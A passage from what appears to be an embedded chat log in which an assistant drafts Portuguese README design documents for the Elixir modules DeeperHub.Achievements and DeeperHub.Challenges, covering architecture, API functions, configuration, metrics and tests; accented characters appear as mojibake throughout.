    *   `AchievementProgressWorker`: Para processar atualiza√ß√µes de progresso em lote ou de forma ass√≠ncrona.
    *   `RetroactiveAchievementWorker`: Para verificar e conceder conquistas retroativamente se novas defini√ß√µes forem adicionadas ou se houver uma corre√ß√£o de bug no rastreamento.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/achievements/
‚îú‚îÄ‚îÄ achievements.ex                   # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ achievements_service.ex       # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ achievement_definition_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ user_achievement_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ criterion_evaluator.ex            # L√≥gica para avaliar crit√©rios de desbloqueio
‚îú‚îÄ‚îÄ event_listener.ex                 # Escuta eventos do sistema
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ achievement_progress_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ retroactive_achievement_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, para camada de cache dedicada)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Defini√ß√£o de Crit√©rios:** A forma como os crit√©rios de desbloqueio s√£o definidos e avaliados √© a parte mais complexa.
    *   **Baseado em Eventos:** A maioria das conquistas ser√° desbloqueada em resposta a eventos espec√≠ficos do sistema.
    *   **Baseado em Estado:** Algumas podem exigir consultas ao estado atual do usu√°rio ou de outras entidades.
    *   **DSL ou JSON para Crit√©rios:** Armazenar os crit√©rios em um formato flex√≠vel (como JSON ou uma DSL interna) na `AchievementDefinitionSchema` permite adicionar novas conquistas sem alterar o c√≥digo do `CriterionEvaluator` extensivamente.
*   **Performance da Avalia√ß√£o:** A avalia√ß√£o de crit√©rios n√£o deve impactar significativamente a performance da a√ß√£o que a desencadeou. Processamento ass√≠ncrono para avalia√ß√µes complexas pode ser necess√°rio.
*   **Retroatividade:** Considerar como lidar com conquistas adicionadas ap√≥s o usu√°rio j√° ter cumprido os crit√©rios.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Administrador Cria uma Nova Conquista \"Explorador Mestre\":**
    *   Admin usa uma interface para definir a conquista: nome \"Explorador Mestre\", descri√ß√£o \"Visite todas as 10 regi√µes secretas\", √≠cone, pontos. Crit√©rio: `%{type: \"counter_all\", events: [\"region.visited_secret\"], targets: [\"region1_id\", ..., \"region10_id\"]}`.
    *   API chama `Achievements.create_achievement_definition(attrs)`.
*   **Usu√°rio Visita uma Regi√£o Secreta:**
    *   O m√≥dulo de jogo/mapa publica um evento: `Core.EventBus.publish(\"region.visited_secret\", %{user_id: \"u123\", region_id: \"region5_id\"})`.
    *   `Achievements.EventListener` recebe o evento.
    *   Atualiza o progresso do usu√°rio para a conquista \"Explorador Mestre\".
    *   Chama `CriterionEvaluator` para verificar se todos os 10 alvos foram atingidos.
    *   Se sim, chama `Achievements.unlock_achievement_for_user(user_id, \"explorador_mestre_id\", %{source_event_id: ...})`.
*   **Usu√°rio Visualiza suas Conquistas:**
    *   UI chama API que leva a `Achievements.list_user_unlocked_achievements(user_id)`.

## üåä 5. Fluxos Importantes

### Fluxo de Desbloqueio de Conquista Baseada em Evento

1.  **M√≥dulo de Dom√≠nio:** Uma a√ß√£o ocorre (ex: usu√°rio completa um desafio). O m√≥dulo publica um evento no `Core.EventBus` (ex: `challenge.completed`, payload: `%{user_id: \"u1\", challenge_id: \"c42\"}`).
2.  **`Achievements.EventListener`:**
    *   Est√° inscrito em eventos como `challenge.completed`.
    *   Recebe o evento.
3.  **`AchievementsService` (ou `CriterionEvaluator` diretamente chamado pelo Listener):**
    *   Para o `user_id` e o tipo de evento recebido (`challenge.completed` com `challenge_id: \"c42\"`):
        *   Busca todas as `AchievementDefinitionSchema`s cujos crit√©rios podem ser afetados por este evento.
        *   Para cada defini√ß√£o de conquista candidata:
            *   Atualiza o progresso do usu√°rio para aquela conquista (se for baseada em contador ou m√∫ltiplas etapas).
            *   Chama `CriterionEvaluator.evaluate(user_id, achievement_definition.criteria, current_progress)` para verificar se os crit√©rios foram totalmente atendidos.
4.  **`CriterionEvaluator.evaluate/3`:**
    *   Interpreta a estrutura de `achievement_definition.criteria`.
    *   Pode precisar consultar dados adicionais do usu√°rio ou seu progresso armazenado.
    *   Retorna `true` se os crit√©rios foram atendidos, `false` caso contr√°rio.
5.  **`AchievementsService` (continua√ß√£o):**
    *   Se `CriterionEvaluator` retornar `true` e o usu√°rio ainda n√£o desbloqueou esta conquista:
        *   Cria um registro `UserAchievementSchema` associando `user_id` e `achievement_definition_id`.
        *   Publica um evento `achievement.unlocked` no `Core.EventBus` (com `user_id` e `achievement_id`).
        *   (Opcional) Enfileira uma notifica√ß√£o para o usu√°rio via `DeeperHub.Notifications`.
        *   (Opcional) Concede pontos de recompensa ou outros benef√≠cios.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Achievements`)

### 6.1. Defini√ß√µes de Conquista (Admin)

*   **`DeeperHub.Achievements.create_achievement_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, AchievementDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: String.t(), description: String.t(), icon_url: String.t(), criteria: map(), points: integer(), type: String.t(), ...}`.
*   **`DeeperHub.Achievements.update_achievement_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, AchievementDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Achievements.delete_achievement_definition(def_id :: String.t(), admin_user_id :: String.t()) :: :ok | {:error, term()}`**
*   **`DeeperHub.Achievements.list_achievement_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(AchievementDefinition.t()), Pagination.t()}`**
    *   `filters`: `:type`, `:is_active`.
    *   `opts`: `:page`, `:per_page`.

### 6.2. Intera√ß√µes do Usu√°rio

*   **`DeeperHub.Achievements.list_user_unlocked_achievements(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserAchievementView.t()), Pagination.t()}`**
    *   `UserAchievementView.t()`: Um mapa/struct combinando dados da defini√ß√£o e a data de desbloqueio.
    *   `opts`: `:page`, `:per_page`, `:sort_by` (`:unlocked_at`, `:name`).
*   **`DeeperHub.Achievements.get_user_achievement_status(user_id :: String.t(), achievement_definition_id :: String.t()) :: {:ok, %{status: :locked | :in_progress | :unlocked, progress: map() | nil, unlocked_at: DateTime.t() | nil}}`**
    *   Retorna o status e o progresso atual (se aplic√°vel) de um usu√°rio para uma conquista.
*   **`DeeperHub.Achievements.get_achievement_details_for_user(user_id :: String.t() | nil, achievement_definition_id :: String.t()) :: {:ok, AchievementDetailsView.t()}` (Nova Sugest√£o)**
    *   `AchievementDetailsView.t()`: Detalhes da defini√ß√£o da conquista, mais o status/progresso espec√≠fico do usu√°rio (se `user_id` fornecido).

### 6.3. Processamento de Eventos (Chamado Internamente pelo `EventListener`)

*   **`DeeperHub.Achievements.process_system_event(user_id :: String.t(), event_name :: atom() | String.t(), event_payload :: map()) :: :ok`**
    *   Aciona a avalia√ß√£o de crit√©rios para o usu√°rio com base no evento.

### 6.4. `DeeperHub.Achievements.unlock_achievement_for_user(user_id :: String.t(), achievement_definition_id :: String.t(), context :: map()) :: {:ok, UserAchievement.t()} | {:error, :already_unlocked | term()}`

*   **Descri√ß√£o:** For√ßa o desbloqueio de uma conquista para um usu√°rio. Usado pelo `CriterionEvaluator` ou por l√≥gicas de concess√£o direta.
*   **`context`:** `%{source: :event | :manual_grant, granted_by_admin_id: String.t() | nil}`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:achievements, :enabled]`** (Boolean): Habilita/desabilita o sistema de conquistas. (Padr√£o: `true`)
*   **`[:achievements, :default_points_for_unlock]`** (Integer): Pontos padr√£o se n√£o especificado na defini√ß√£o. (Padr√£o: `10`)
*   **`[:achievements, :notify_on_unlock]`** (Boolean): Se deve enviar uma notifica√ß√£o ao usu√°rio quando uma conquista √© desbloqueada. (Padr√£o: `true`)
*   **`[:achievements, :criteria_evaluator, :max_depth]`** (Integer): Limite de profundidade para avalia√ß√£o de crit√©rios complexos.
*   **`[:achievements, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:achievements, :cache, :user_unlocked_list_ttl_seconds]`** (Integer).
*   **`[:achievements, :retroactive_worker, :enabled]`** (Boolean).
*   **`[:achievements, :retroactive_worker, :batch_size]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Notifications`: Para notificar desbloqueios.
*   `DeeperHub.Audit`: Para auditar o gerenciamento de defini√ß√µes.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Possivelmente uma biblioteca para parsing/avalia√ß√£o de uma DSL de crit√©rios, se for complexa.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Administradores:** Usam uma interface (Web ou Console) que chama as fun√ß√µes `*_achievement_definition/*` para gerenciar as conquistas dispon√≠veis.
*   **M√≥dulos de Dom√≠nio:** Publicam eventos no `Core.EventBus` quando a√ß√µes relevantes para conquistas ocorrem. Eles n√£o precisam conhecer diretamente o m√≥dulo `Achievements` para o rastreamento de progresso.
    ```elixir
    # Em DeeperHub.Servers.Service
    def user_joins_server(user_id, server_id) do
      # ... l√≥gica ...
      Core.EventBus.publish(\"server.user_joined\", %{user_id: user_id, server_id: server_id})
    end
    ```
*   **`Achievements.EventListener`:**
    ```elixir
    # Em Achievements.EventListener
    def handle_event(\"server.user_joined\", payload, _metadata) do
      Achievements.process_system_event(payload.user_id, \"server.user_joined\", payload)
    end
    ```
*   **Frontend/API:** Para exibir conquistas, chama os endpoints que usam `list_user_unlocked_achievements/1` ou `get_achievement_details_for_user/2`.

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `AchievementDefinitionSchema`.
*   Testar a l√≥gica do `CriterionEvaluator` com diferentes tipos de crit√©rios e cen√°rios de dados de usu√°rio/evento.
*   Testar o desbloqueio de conquistas e a cria√ß√£o correta de `UserAchievementSchema`.
*   Testar que um usu√°rio n√£o pode desbloquear a mesma conquista (n√£o repet√≠vel) duas vezes.
*   Testar o `EventListener` com eventos mockados.
*   Testar a l√≥gica de atualiza√ß√£o de progresso.
*   Localiza√ß√£o: `test/deeper_hub/achievements/`.

### 10.2. M√©tricas

*   `deeper_hub.achievements.unlocked.count` (tags: `achievement_id`, `user_segment`)
*   `deeper_hub.achievements.definitions.total.gauge`
*   `deeper_hub.achievements.criteria_evaluation.duration_ms` (Histograma, tags: `achievement_id`)
*   `deeper_hub.achievements.event_listener.events_processed.count` (tags: `source_event_type`)
*   `deeper_hub.achievements.progress_updates.count` (tags: `achievement_id`)

### 10.3. Logs

*   **N√≠vel INFO:** Conquista desbloqueada por usu√°rio. Nova defini√ß√£o de conquista criada/atualizada.
*   **N√≠vel DEBUG:** Evento recebido pelo `EventListener`. Avalia√ß√£o de crit√©rio em andamento com detalhes.
*   **N√≠vel WARNING:** Crit√©rio de conquista malformado ou imposs√≠vel de avaliar.
*   **N√≠vel ERROR:** Falha ao persistir desbloqueio de conquista.

### 10.4. Telemetria

*   `[:deeper_hub, :achievements, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, admin_id: id}`
*   `[:deeper_hub, :achievements, :user_achievement, :unlocked]`
    *   Metadados: `%{user_id: id, achievement_id: id, source: :event | :manual | :retroactive}`
*   `[:deeper_hub, :achievements, :criteria_evaluation, :evaluated]`
    *   Metadados: `%{user_id: id, achievement_id: id, criteria_met: boolean, details: ...}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na avalia√ß√£o de um crit√©rio n√£o devem impedir o processamento de outros crit√©rios ou eventos.
*   Se o `EventListener` falhar ao processar um evento, o evento pode ser reenfileirado (se o EventBus suportar) ou logado para investiga√ß√£o.
*   Erros ao persistir `UserAchievement` devem ser tratados (ex: retry, log).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Crit√©rios de Desbloqueio:** Garantir que os crit√©rios n√£o possam ser facilmente manipulados ou explorados pelos usu√°rios para desbloquear conquistas indevidamente.
*   **Autoriza√ß√£o de Gerenciamento:** Apenas administradores devem poder criar/modificar defini√ß√µes de conquistas.
*   **Dados de Progresso:** Se o progresso for armazenado, garantir sua integridade.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao definir novas conquistas, pense cuidadosamente nos crit√©rios e como eles ser√£o acionados por eventos do sistema.
*   Documente os crit√©rios de cada conquista de forma clara.
*   Certifique-se de que o `EventListener` esteja inscrito nos eventos corretos para cada conquista.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma interface de UI para administradores gerenciarem as defini√ß√µes de conquistas.
*   [ ] Adicionar \"conquistas secretas\" que n√£o s√£o vis√≠veis at√© serem desbloqueadas.
*   [ ] Permitir conquistas com m√∫ltiplos n√≠veis (Bronze, Prata, Ouro).
*   [ ] Suporte para conquistas baseadas em tempo (ex: \"fazer login durante o evento de anivers√°rio\").
*   [ ] Adicionar um feed de atividades para conquistas desbloqueadas (vis√≠vel para amigos ou globalmente).
*   [ ] Permitir que usu√°rios \"fixem\" suas conquistas favoritas em seus perfis.
*   [ ] Sistema de \"quase l√°\" para mostrar aos usu√°rios o qu√£o perto est√£o de desbloquear certas conquistas.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este README para `DeeperHub.Achievements` deve dar uma boa ideia de como documentar os m√≥dulos de dom√≠nio.

Qual m√≥dulo gostaria de abordar em seguida? Podemos pegar outro \"ex-Servi√ßo\" como `DeeperHub.Challenges` ou `DeeperHub.Rewards`, ou algo diferente?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""√ìtimo! Vamos continuar com `DeeperHub.Challenges`, que complementa bem o `DeeperHub.Achievements` no contexto de engajamento e gamifica√ß√£o.

---

# M√≥dulo: `DeeperHub.Challenges` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Challenges`

O m√≥dulo `DeeperHub.Challenges` √© respons√°vel por gerenciar **desafios (challenges)** dentro da plataforma DeeperHub. Desafios s√£o tarefas ou objetivos espec√≠ficos que os usu√°rios podem tentar completar, geralmente dentro de um per√≠odo de tempo limitado ou com certas condi√ß√µes, para ganhar recompensas, reconhecimento ou progredir no sistema.

Este m√≥dulo lida com:
*   A defini√ß√£o e o gerenciamento dos desafios dispon√≠veis (nome, descri√ß√£o, crit√©rios de conclus√£o, per√≠odo de validade, recompensas associadas).
*   O rastreamento da participa√ß√£o e do progresso dos usu√°rios nos desafios.
*   A verifica√ß√£o da conclus√£o dos desafios pelos usu√°rios.
*   A concess√£o de recompensas ou reconhecimento pela conclus√£o de desafios.

O objetivo √© aumentar o engajamento do usu√°rio, incentivar a explora√ß√£o de funcionalidades e fornecer metas claras e recompensadoras. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Defini√ß√µes de Desafios (`create_challenge_definition/1`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e ativem/desativem defini√ß√µes de desafios.
    *   Cada defini√ß√£o inclui: nome, descri√ß√£o, crit√©rios de conclus√£o (podem ser complexos, baseados em eventos ou estado), data de in√≠cio e fim (para desafios tempor√°rios), recompensas associadas (ex: pontos, itens virtuais, conquistas), pr√©-requisitos (outros desafios ou conquistas).
*   **Participa√ß√£o do Usu√°rio em Desafios (`join_challenge/2`, `leave_challenge/2`):**
    *   Permitir que usu√°rios se inscrevam ou sejam automaticamente inscritos em desafios.
    *   Permitir que usu√°rios abandonem um desafio (se aplic√°vel).
*   **Rastreamento de Progresso do Usu√°rio:**
    *   Receber eventos do sistema ou chamadas diretas que indicam progresso do usu√°rio em rela√ß√£o a um desafio.
    *   Manter o estado do progresso para desafios que exigem m√∫ltiplas etapas ou contadores (ex: \"complete 5 tarefas do tipo X\").
*   **Verifica√ß√£o de Conclus√£o de Desafios (`check_challenge_completion/2`):**
    *   Verificar automaticamente se um usu√°rio atendeu aos crit√©rios para completar um desafio ap√≥s um evento relevante ou uma verifica√ß√£o peri√≥dica.
    *   Registrar que um usu√°rio completou um desafio, incluindo a data de conclus√£o.
*   **Concess√£o de Recompensas (Integra√ß√£o):**
    *   Ao completar um desafio, acionar a concess√£o das recompensas associadas (integrando-se com `DeeperHub.Rewards` ou outros sistemas relevantes).
*   **Consulta de Desafios:**
    *   Listar desafios ativos/dispon√≠veis para um usu√°rio (`list_available_challenges_for_user/1`).
    *   Listar desafios em que um usu√°rio est√° participando ou j√° completou (`list_user_challenges/1`).
    *   Mostrar o status e progresso de um usu√°rio em um desafio espec√≠fico (`get_user_challenge_status/2`).
*   **Notifica√ß√µes (Integra√ß√£o):**
    *   Notificar usu√°rios sobre novos desafios dispon√≠veis, progresso, conclus√£o e recompensas (via `DeeperHub.Notifications`).
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a participa√ß√£o e conclus√£o de desafios.
    *   Publicar eventos de dom√≠nio (ex: `challenge.joined`, `challenge.completed`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de defini√ß√µes de desafios.
*   **Caching:**
    *   Cachear defini√ß√µes de desafios e, potencialmente, o status de desafios para usu√°rios ativos.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Challenges` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a desafios.
    *   Delega para o `ChallengesService`.
2.  **`DeeperHub.Challenges.Services.ChallengesService` (ou `DefaultChallengesService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio principal para o sistema de desafios.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `ChallengeDefinitionSchema` e `UserChallengeSchema`.
        *   `DeeperHub.Core.EventBus`: Para escutar eventos do sistema (progresso) e publicar eventos de desafios.
        *   `DeeperHub.Core.Cache`: Para caching.
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
        *   `DeeperHub.Notifications`: Para notificar usu√°rios.
        *   `DeeperHub.Rewards`: Para conceder recompensas.
        *   `DeeperHub.Achievements`: Desafios podem desbloquear conquistas.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de defini√ß√µes.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Challenges.Schemas.ChallengeDefinitionSchema`:** Armazena os detalhes de cada desafio (nome, descri√ß√£o, crit√©rios JSON/DSL, datas de validade, `reward_ids`, `achievement_unlocks_id`).
    *   **`DeeperHub.Challenges.Schemas.UserChallengeSchema`:** Tabela de jun√ß√£o/progresso (`user_id`, `challenge_definition_id`, `status` (`:not_started`, `:in_progress`, `:completed`, `:failed`), `progress` (mapa JSONB), `started_at`, `completed_at`).
4.  **`DeeperHub.Challenges.CriterionEvaluator` (M√≥dulo Funcional ou Servi√ßo):**
    *   **Responsabilidade:** Avaliar se os crit√©rios de uma `ChallengeDefinition` foram atendidos por um usu√°rio com base em seus dados, progresso ou eventos. Similar ao do `Achievements`.
5.  **`DeeperHub.Challenges.EventListener` (GenServer ou m√≥dulo de callback do EventBus):**
    *   **Responsabilidade:** Escutar eventos do sistema e atualizar o progresso dos usu√°rios nos desafios ativos.
6.  **Workers (Opcional):**
    *   `ChallengeStatusUpdateWorker`: Para verificar periodicamente desafios expirados ou para processar conclus√µes em lote.
    *   `ChallengeNotificationWorker`: Para enviar lembretes sobre desafios que est√£o para expirar.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/challenges/
‚îú‚îÄ‚îÄ challenges.ex                     # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ challenges_service.ex         # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ challenge_definition_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ user_challenge_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îú‚îÄ‚îÄ criterion_evaluator.ex            # L√≥gica para avaliar crit√©rios
‚îú‚îÄ‚îÄ event_listener.ex                 # Escuta eventos do sistema
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ challenge_status_update_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ challenge_notification_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, da documenta√ß√£o original)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Defini√ß√£o de Crit√©rios de Conclus√£o:** Assim como nas conquistas, a flexibilidade na defini√ß√£o dos crit√©rios √© chave. Usar JSON ou uma DSL interna armazenada no `ChallengeDefinitionSchema` √© uma boa abordagem.
*   **Desafios Temporizados vs. Cont√≠nuos:** O sistema deve suportar ambos os tipos.
*   **Pr√©-requisitos:** Capacidade de definir que um desafio s√≥ fica dispon√≠vel ap√≥s completar outro desafio ou uma conquista.
*   **Recompensas M√∫ltiplas:** Um desafio pode conceder v√°rias recompensas (pontos, itens, desbloquear outra feature, etc.). A integra√ß√£o com `DeeperHub.Rewards` √© importante.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Administrador Cria um Desafio Semanal \"Top Reviewer\":**
    *   Admin define o desafio: \"Escreva 5 reviews de alta qualidade esta semana\", com recompensa de \"Badge Exclusivo\" e 100 pontos.
    *   API chama `Challenges.create_challenge_definition(attrs)`.
*   **Usu√°rio se Inscreve em um Desafio de \"Completar o Tutorial\":**
    *   Novo usu√°rio v√™ o desafio \"Complete todos os passos do tutorial\".
    *   Clica em \"Aceitar Desafio\". API chama `Challenges.join_challenge(user_id, tutorial_challenge_id)`.
*   **Usu√°rio Progride em um Desafio de \"Postar 3 Coment√°rios √öteis\":**
    *   Usu√°rio posta um coment√°rio. O m√≥dulo de coment√°rios publica `comment.posted` no EventBus.
    *   `Challenges.EventListener` recebe, verifica se o usu√°rio est√° no desafio, e se o coment√°rio √© \"√∫til\" (l√≥gica complexa aqui).
    *   `ChallengesService` atualiza o progresso do usu√°rio no `UserChallengeSchema` (ex: de 1/3 para 2/3).
*   **Usu√°rio Completa o Desafio \"Top Reviewer\":**
    *   Ap√≥s a 5¬™ review de qualidade, o `CriterionEvaluator` determina a conclus√£o.
    *   `ChallengesService` marca o `UserChallenge` como `:completed`.
    *   Chama `DeeperHub.Rewards.grant_reward(user_id, badge_reward_id)` e `DeeperHub.PointsService.add_points(user_id, 100)`.
    *   Notifica o usu√°rio.

## üåä 5. Fluxos Importantes

### Fluxo de Verifica√ß√£o e Conclus√£o de Desafio

1.  **Evento Relevante ou Verifica√ß√£o Agendada:**
    *   `Challenges.EventListener` recebe um evento do `Core.EventBus` (ex: `review.approved`, `task.completed`).
    *   OU `ChallengeStatusUpdateWorker` executa uma verifica√ß√£o peri√≥dica.
2.  **`ChallengesService`:**
    *   Para o `user_id` e o evento/contexto, busca os `UserChallenge`s ativos e relevantes (status `:in_progress`).
    *   Para cada `UserChallenge` ativo:
        *   Obt√©m a `ChallengeDefinitionSchema` correspondente.
        *   Atualiza o campo `progress` no `UserChallengeSchema` com base no evento/estado atual.
        *   Chama `CriterionEvaluator.evaluate(user_id, challenge_definition.criteria, user_challenge.progress)`.
3.  **`CriterionEvaluator.evaluate/3`:**
    *   Avalia se todos os crit√©rios foram atendidos. Retorna `true` ou `false`.
4.  **`ChallengesService` (continua√ß√£o):**
    *   Se `true` e o desafio ainda n√£o est√° `:completed`:
        *   Atualiza o `UserChallengeSchema` para `status: :completed`, `completed_at: DateTime.utc_now()`.
        *   Publica evento `challenge.completed` no `Core.EventBus`.
        *   Para cada `reward_id` na defini√ß√£o do desafio, chama `DeeperHub.Rewards.grant_reward(user_id, reward_id, %{source_challenge_id: challenge_id})`.
        *   (Opcional) Chama `DeeperHub.Achievements.unlock_achievement_for_user(...)` se o desafio desbloquear uma conquista.
        *   Chama `DeeperHub.Notifications.send_notification(user_id, :challenge_completed, %{challenge_name: ..., rewards: ...})`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Challenges`)

### 6.1. Defini√ß√µes de Desafio (Admin)

*   **`DeeperHub.Challenges.create_challenge_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, ChallengeDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., criteria: map(), start_date: DateTime.t() | nil, end_date: DateTime.t() | nil, reward_ids: list(String.t()), prerequisites: list(map())}`.
*   **`DeeperHub.Challenges.update_challenge_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, ChallengeDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Challenges.list_challenge_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(ChallengeDefinition.t()), Pagination.t()}`**
    *   `filters`: `:is_active_now`, `:type`.

### 6.2. Intera√ß√µes do Usu√°rio

*   **`DeeperHub.Challenges.list_available_challenges_for_user(user_id :: String.t(), opts :: keyword()) :: {:ok, list(ChallengeView.t()), Pagination.t()}`**
    *   `ChallengeView.t()`: Combina defini√ß√£o com status/progresso do usu√°rio.
    *   Mostra desafios ativos que o usu√°rio pode participar (e n√£o completou ou falhou, e atende pr√©-requisitos).
*   **`DeeperHub.Challenges.join_challenge(user_id :: String.t(), challenge_definition_id :: String.t()) :: {:ok, UserChallenge.t()} | {:error, :already_joined | :not_available | :prerequisites_not_met}`**
*   **`DeeperHub.Challenges.leave_challenge(user_id :: String.t(), challenge_definition_id :: String.t()) :: :ok | {:error, :not_joined}`** (Se aplic√°vel)
*   **`DeeperHub.Challenges.get_user_challenge_status(user_id :: String.t(), challenge_definition_id :: String.t()) :: {:ok, UserChallenge.t() | %{status: :not_joined}}`**
    *   Retorna o `UserChallenge` com status e progresso.
*   **`DeeperHub.Challenges.list_user_challenges(user_id :: String.t(), filters :: map(), opts :: keyword()) :: {:ok, list(UserChallengeView.t()), Pagination.t()}`**
    *   `filters`: `:status` (`:in_progress`, `:completed`).

### 6.3. Processamento de Progresso (Chamado Internamente)

*   **`DeeperHub.Challenges.record_user_progress(user_id :: String.t(), challenge_definition_id :: String.t() | nil, event_type :: atom(), event_data :: map()) :: :ok`**
    *   Se `challenge_definition_id` for `nil`, o sistema tenta encontrar desafios relevantes para o `event_type`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:challenges, :enabled]`** (Boolean): Habilita/desabilita o sistema de desafios. (Padr√£o: `true`)
*   **`[:challenges, :default_reward_points]`** (Integer): Pontos padr√£o se um desafio n√£o especificar. (Padr√£o: `50`)
*   **`[:challenges, :notify_on_completion]`** (Boolean). (Padr√£o: `true`)
*   **`[:challenges, :notify_on_new_available]`** (Boolean).
*   **`[:challenges, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:challenges, :cache, :user_status_ttl_seconds]`** (Integer).
*   **`[:challenges, :worker, :status_update_interval_minutes]`** (Integer).

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Rewards`: Para conceder recompensas.
*   `DeeperHub.Achievements`: Desafios podem ser pr√©-requisitos ou conceder conquistas.
*   `DeeperHub.Notifications`: Para notifica√ß√µes.
*   `DeeperHub.Audit`: Para auditar gerenciamento de defini√ß√µes.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Biblioteca CRON para `ChallengeStatusUpdateWorker` (se usar agendamento CRON).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Administradores:** Criam e gerenciam `ChallengeDefinitions` via UI/Console.
*   **M√≥dulos de Dom√≠nio:** Publicam eventos relevantes no `Core.EventBus`.
*   **`Challenges.EventListener`:** Consome esses eventos e chama `Challenges.record_user_progress` ou `ChallengesService` diretamente.
*   **UI do Usu√°rio:**
    *   Mostra desafios dispon√≠veis (`list_available_challenges_for_user`).
    *   Permite que usu√°rios vejam seu progresso (`get_user_challenge_status`).
    *   Exibe desafios completados (`list_user_challenges` com filtro).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `ChallengeDefinitionSchema`.
*   Testar a l√≥gica do `CriterionEvaluator` para diferentes tipos de crit√©rios (contagem, sequ√™ncia, estado).
*   Testar os fluxos de participa√ß√£o, progresso e conclus√£o de desafios.
*   Testar a concess√£o correta de recompensas.
*   Testar a l√≥gica de pr√©-requisitos.
*   Testar desafios temporizados (in√≠cio, fim, expira√ß√£o).
*   Localiza√ß√£o: `test/deeper_hub/challenges/`.

### 10.2. M√©tricas

*   `deeper_hub.challenges.definition.created.count`
*   `deeper_hub.challenges.user.joined.count` (tags: `challenge_id`)
*   `deeper_hub.challenges.user.progress_updated.count` (tags: `challenge_id`)
*   `deeper_hub.challenges.user.completed.count` (tags: `challenge_id`, `user_segment`)
